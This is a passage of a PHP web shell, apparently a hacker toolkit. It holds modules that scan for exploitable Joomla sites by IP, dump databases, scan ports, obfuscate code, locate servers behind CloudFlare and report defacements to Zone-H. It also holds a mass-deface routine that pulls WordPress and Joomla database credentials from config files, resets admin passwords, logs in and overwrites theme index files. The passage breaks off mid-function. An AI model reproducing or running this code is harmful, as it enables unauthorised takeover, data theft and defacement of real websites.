			<script>
				document.location = 'http://205.196.121.248/0sod33qw66ug/wypyz555sc9bn7h/Cryptography_for_Developers.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'forensic') {
			?>
			<script>
				document.location = 'http://205.196.120.85/uisebgmioyjg/6l70l00ba9yoksq/CD_and_DVD_Forensics.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'metasploit') {
			?>
			<script>
				document.location = 'http://199.91.153.192/3t115p2f6gvg/zvrrddmq6icqtd2/Metasploit_Toolkit.pdf';
			</script>
			<?php
		}elseif ( $pilih == 'stealing_network') {
			?>
			<script>
				document.location = 'http://205.196.123.138/wbsxltb8rbtg/5vm8a1d23i9zje3/Stealing_the_Network_-_How_to_Own_the_Box.pdf';
			</script>
			<?php
		}elseif ( $pilih == 'security_polices') {
			?>
			<script>
				document.location = 'http://199.91.153.73/6le01f562ehg/6l5ep021dhvlhlq/Creating_Security_Policies_and_Implementing_Identity_Management_with_Active_Directory.pdf';
			</script>
			<?php
		}
}

}
////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'jss'))
    {@ini_set('output_buffering',0); 
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=jss" method="post">
    <?php
	echo '

<br><br><br><p align="center"><b><font size="3">Enter Targeting IP</font></b></p><br>
<form method="POST">
        <p align="center"><input type="text" class="inputz" name="site" size="65"><input class="inputzbut" type="submit" value="Scan"></p>
</form><center>

';
@set_time_limit(0);
@error_reporting(E_ALL | E_NOTICE);
 
function check_exploit($comxx){
 
$link ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$comxx&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
 
$result = @file_get_contents($link);
 
if (eregi("No results",$result))  {
 
echo"<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>";
 
}else{
 
echo"<td><a href='$link'>Found</a></td><td><=</td></tr>";
 
}
}
 
function check_com($url){
 
$source = @file_get_contents($url);
 
preg_match_all('{option,(.*?)/}i',$source,$f);
preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
preg_match_all('{/components/(.*?)/}i',$source,$f3);
 
$arz=array_merge($f2[1],$f[1],$f3[1]);
 
$coms=array();
 
foreach(array_unique($arz) as $x){
$coms[]=$x;
}
 
foreach($coms as $comm){
 
echo "<tr><td>$comm</td>";
check_exploit($comm);
}
 
}
 
function sec($site){
preg_match_all('{http://(.*?)(/index.php)}siU',$site, $sites);
if(eregi("www",$sites[0][0])){
return $site=str_replace("index.php","",$sites[0][0]);
}else{
return $site=str_replace("http://","http://www.",str_replace("index.php","",$sites[0][0]));
}}
 
$npages = 50000;
 
if ($_POST)
{
  $ip = trim(strip_tags($_POST['site']));
  $npage = 1;
  $allLinks = array();
 
 
   while($npage <= $npages)
  {
 
  $x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);
 
 
        if ($x)
        {
                preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>siU', $x, $findlink);
              
                foreach ($findlink[1] as $fl)
              
                $allLinks[]=sec($fl);
              
              
                $npage = $npage + 10;
              
                if (preg_match('(first=' . $npage . '&amp)siU', $x, $linksuiv) == 0)
                        break;                    
        }
      
    else
                break;
  }
 
 
$allDmns = array();
 
foreach ($allLinks as $kk => $vv){
 
$allDmns[] = $vv;
}
                      
echo'<table border="1"  width=\"80%\" align=\"center\">
<tr><td width=\"30%\"><b>Server IP&nbsp;&nbsp;&nbsp;&nbsp; : </b></td><td><b>'.$ip.'</b></td></tr>                    
<tr><td width=\"30%\"><b>Sites Found&nbsp; : </b></td><td><b>'.count(array_unique($allDmns)).'</b></td></tr>
</table>';
echo "<br><br>";
 
echo'<table border="1" width="80%" align=\"center\">';
 
foreach(array_unique($allDmns) as $h3h3){
 
echo'<tr id=new><td><b><a href='.$h3h3.'>'.$h3h3.'</a></b></td><td><b>Exploit-db</b></td><td><b>challenge of Exploiting ..!</b></td></tr>';
 
check_com($h3h3);
 
}
 
echo"</table>";
 
}
}
/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'dump'))
    {@ini_set('output_buffering',0); 
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=dump" method="post">
    <?php
	echo'<br><b><center>+--=[ Database Dump ]=--+</center></b><br><br>';
echo $head.'<p align="center">';
echo '
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}

}
/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'port-sc'))
    {@ini_set('output_buffering',0); 
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=port-sc" method="post">
    <?php
    echo '<br><br><center><br><b>+--=[ Port Scanner ]=--+</b><br>';
    $start = strip_tags($_POST['start']);
    $end = strip_tags($_POST['end']);
    $host = strip_tags($_POST['host']);
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
    for($i = $start; $i<=$end; $i++){
    $fp = @fsockopen($host, $i, $errno, $errstr, 3);
    if($fp){
    echo 'Port '.$i.' is <font color=green>open</font><br>';
    }
    flush();
    }
    }else{
    echo '<table class=tabnet style="width:300px;padding:0 1px;">
   <input type="hidden" name="y" value="phptools">
   <tr><th colspan="5">Port Scanner</th></center></tr>
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#00ff00;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="end" value="5000"/></td>
   </tr><td><input class="inputzbut" type="submit" style="color:#00ff00" value="Scan Ports" />
   </td></form></center></table>';
    }
}
/////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'hash'))
    {@ini_set('output_buffering',0); 
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=hash" method="post"><br><br><br>
	
<?php 
$submit= $_POST['ffffff'];
if (isset($submit)) {
$pass = $_POST['passw']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
$hash = md5($pass); // md5 hash #1
$md4 = hash("md4",$pass);
$hash_md5 = md5($salt.$pass); // md5 hash with salt #2
$hash_md5_double = md5(sha1($salt.$pass)); // md5 hash with salt & sha1 #3
$hash1 = sha1($pass); // sha1 hash #4
$sha256 = hash("sha256",$text);
$hash1_sha1 = sha1($salt.$pass); // sha1 hash with salt #5
$hash1_sha1_double = sha1(md5($salt.$pass)); // sha1 hash with salt & md5 #6
}
echo '<form action="" method="post"><b>';
 echo '<table class=tabnet><tr><th colspan="2">Password Hash</th></center></tr>';
echo '<tr><td><b>masukan kata yang ingin di encrypt:</b></td>';
echo '<td><input class="inputz" type="text" name="passw" size="40" />';
echo '<input class="inputzbut" type="submit" name="ffffff" value="hash" />';
echo '</td></tr>';
echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value='.$pass.'></td></tr>';
echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value='.$hash.'></td></tr>';
echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value='.$md4.'></td></tr>';
echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value='.$hash_md5.'></td></tr>';
echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value='.$hash_md5_double.'></td></tr>';
echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value='.$hash1.'></td></tr>';
echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value='.$sha256.'></td></tr>';
echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value='.$hash1_sha1.'></td></tr>';
echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value='.$hash1_sha1_double.'></td></tr></table>';
}
/////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'zone'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=zone" method="post">

<br><br><center>
<!-- Zone-H -->
<form action="" method='POST'><table><table class='tabnet'><tr>
<td style='background-color:#0000;padding-left:10px;'><tr><tr><th colspan="2"><h2>Zone-H Defacer</h2></th></tr></td></tr><tr><td height='45' colspan='2'><form method="post">
<input type="text" class="inputz" name="defacer" value="Nama Defacer" />
<select name="hackmode" class="inputz" >
<option >------------------------Pilih Salah Satu------------------------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>

<select name="reason" class="inputz" >
<option >-------------Pilih Salah Satu---------------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
<input type="hidden" name="action" value="zone">
<center><textarea style="background:black;outline:none;" name="domain" cols="116" rows="9" id="domains">List Of Domains</textarea>
<br /><input class='inputzbut' type="submit" value="Send Now !" name="SendNowToZoneH" /><br></center></table>
</form></td></tr></table></form>
<!-- End Of Zone-H -->
</td></center><br><br>

<?php
function ZoneH($url, $hacker, $hackmode,$reson, $site ) 
{ 
    $k = curl_init(); 
    curl_setopt($k, CURLOPT_URL, $url); 
    curl_setopt($k,CURLOPT_POST,true); 
    curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson); 
    curl_setopt($k,CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($k, CURLOPT_RETURNTRANSFER, true); 
    $kubra = curl_exec($k); 
    curl_close($k); 
    return $kubra; 
} 
{ 
                ob_start(); 
                $sub = @get_loaded_extensions(); 
                if(!in_array("curl", $sub)) 
                { 
                    die('<center><b>[-] Curl Is Not Supported !![-]</b></center>'); 
                } 
             
                $hacker = $_POST['defacer']; 
                $method = $_POST['hackmode']; 
                $neden = $_POST['reason']; 
                $site = $_POST['domain']; 
                 
                if (empty($hacker)) 
                { die ("<center><b>[+] YOU MUST FILL THE ATTACKER NAME [+]</b></center>"); } 
                elseif($method == "--------SELECT--------")  
                { die("<center><b>[+] YOU MUST SELECT THE METHOD [+]</b></center>"); } 
                elseif($neden == "--------SELECT--------")  
                {  die("<center><b>[+] YOU MUST SELECT THE REASON [+]</b></center>"); } 
                elseif(empty($site))  
                { die("<center><b>[+] YOU MUST INTER THE SITES LIST [+]</b></center>"); } 
                $i = 0; 
                $sites = explode("\n", $site); 
                while($i < count($sites))  
                { 
                    if(substr($sites[$i], 0, 4) != "http")  
                    { 
                        $sites[$i] = "http://".$sites[$i]; 
                    } 
                    ZoneH("http://www.zone-h.com/notify/single", $hacker, $method, $neden, $sites[$i]); 
                    echo "Domain : ".$sites[$i]." Defaced Last Years !"; 
                    ++$i; 
                } 
                echo "<center>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</center>"; 
            } 

	
}

/////////////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'bypass-cf'))
{	@ini_set('output_buffering',0); 
echo '<form method="POST"><br><br><center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass<font color="#CC0000">CloudFlare</font> ]=--+</font></b></p><select class="inputz" name="krz"><option>ftp</option><option>direct-conntect</option><option>webmail</option><option>cpanel</option>
</select><input class="inputz" type="text" name="target" value="url"><input class="inputzbut" type="submit" value="Bypass"></center>';

$target = $_POST['target'];
# Bypass From FTP
if($_POST['krz'] == "ftp") {
$ftp = gethostbyname("ftp."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
} 
# Bypass From Direct-Connect
if($_POST['krz'] == "direct-conntect") {
$direct = gethostbyname("direct-connect."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
}
# Bypass From Webmail
if($_POST['krz'] == "webmail") {
$web = gethostbyname("webmail."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
}
# Bypass From Cpanel
if($_POST['krz'] == "cpanel") {
$cpanel = gethostbyname("cpanel."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
}
}
//////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'hashid')) {@ini_set('output_buffering',0); 
if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult = "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Entered";
	}
	
	?>
	<center><br><Br><br>
	
		<form action="" method="POST">
		<tr>
		<table class="tabnet">
		<th colspan="5">Hash Identification</th>
		<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
		<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
	</table></tr></form>
	</center>
	
	<?php
 }
//////////////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'string')){@ini_set('output_buffering',0); 
$text = $_POST['code'];
?><center><br><br><b>+--=[ Script Encode & Decode ]=--+</b><br><br>
<form method="post"><br><br><br>
<textarea class='inputz' cols=80 rows=10 name="code"></textarea><br><br>
<select class='inputz' size="1" name="ope">
<option value="base64">Base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
</select>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
<input class='inputzbut' type='submit' name='submits' value='Decrypt'>
</form>

<?php 
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;default:break;}}

$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;default:break;}}

echo '<textarea cols=80 rows=10 class="inputz" readonly>'.$codi.'</textarea></center><BR><BR>';

}

/////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'mass'))
{@ini_set('output_buffering',0); 
?>
<br><br><center><b><font size=4>+--=[ Multi Mass Deface ]=--+</font></b></center>
	<form method='post'><br><center><table class='tabnet'>
	<tr><th colspan='5'><b>Multi Mass Deface</b></th></tr>
	<tr><th><b>Folder Mass Deface</b></th><th><b>Wordpress & Joomla</b></th></tr>
	<tr><td><input class='inputzbut' type='submit' name='massdeface' value="Folder Mass Deface" /></td>
	<td><input class='inputzbut' type='submit'name='wpjomlamass' value="Wordpress & Joomla" /></td></tr>
	</table></center>
	</form><br><hr><br><br>
<?php
#==================[ Multi Mass Deface ]==================#
if(isset($_POST['wpjomlamass']))
{
error_reporting(0);function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){$ar0=explode($marqueurDebutLien, $text);$ar1=explode($marqueurFinLien, $ar0[$i]);return trim($ar1[0]);}function randomt() {$chars = "abcdefghijkmnopqrstuvwxyz023456789";srand((double)microtime()*1000000);$i = 0;$pass = '';while ($i <= 7) {$num = rand() % 33;$tmp = substr($chars, $num, 1);$pass = $pass . $tmp;$i++;}return $pass;}function index_changer_wp($conf, $content) {$output = '';$dol = '$';$go = 0;$username = entre2v2($conf,"define('DB_USER', '","');");$password = entre2v2($conf,"define('DB_PASSWORD', '","');");$dbname = entre2v2($conf,"define('DB_NAME', '","');");$prefix = entre2v2($conf,$dol."table_prefix  = '","'");$host = entre2v2($conf,"define('DB_HOST', '","');");$link=mysql_connect($host,$username,$password);if($link) {mysql_select_db($dbname,$link) ;$dol = '$';$req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1");} else {$output.= "[-] DB Error<br />";}if($req1) {$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");$data = mysql_fetch_array($req);$site_url=$data["option_value"]; $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");$data = mysql_fetch_array($req);$template = $data["option_value"];$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");$data = mysql_fetch_array($req);$current_theme = $data["option_value"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/wp-login.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);$pos = strpos($buffer,"action=logout");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";$go = 1;}if($go) {$cond = 0;$url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"/index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Updated Successfuly<br />";$hk = explode('public_html',$_file);$output.= '[+] Deface '.file_get_contents($site_url.str_replace('/blog','',$hk[1]));$cond = 1;}} else {$url2=$site_url.'/wp-admin/theme-editor.php?file=index.php&theme='.$template;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&theme=".$template."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template Updated Successfuly<br />";$output.= '[+] Deface '.file_get_contents($site_url.'/wp-content/themes/'.$template.'/index.php');$cond = 1;}} else {$output.= "[-] index.php can not load in Theme Editor<br />";}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.'COOKIE.txt');return array('cond'=>$cond, 'output'=>$output);}function index_changer_joomla($conf, $content, $domain) {$doler = '$';$username = entre2v2($conf, $doler."user = '", "';");$password = entre2v2($conf, $doler."password = '", "';");$dbname = entre2v2($conf, $doler."db = '", "';");$prefix = entre2v2($conf, $doler."dbprefix = '", "';");$host = entre2v2($conf, $doler."host = '","';");$co=randomt();$site_url = "http://".$domain."/administrator";$output = '';$cond = 0; $link=mysql_connect($host, $username, $password);if($link) {mysql_select_db($dbname,$link) ;$req1 = mysql_query("UPDATE `".$prefix."users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0");$req = mysql_numrows(mysql_query("SHOW TABLES LIKE '".$prefix."extensions'"));} else {$output.= "[-] DB Error<br />";}if($req1){if ($req) {$req = mysql_query("SELECT * from  `".$prefix."template_styles` WHERE `client_id` = '0' and `home` = '1'");$data = mysql_fetch_array($req);$template_name = $data["template"];$req = mysql_query("SELECT * from  `".$prefix."extensions` WHERE `name`='".$template_name."' or `element` = '".$template_name."'");$data = mysql_fetch_array($req);$template_id = $data["extension_id"];$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$return = entre2v2($buffer ,'<input type="hidden" name="return" value="','"');$hidden = entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);if($return && $hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_REFERER, $url2);curl_setopt($ch, CURLOPT_POSTFIELDS, "username=admin&passwd=123123&option=com_login&task=login&return=".$return."&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos){$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 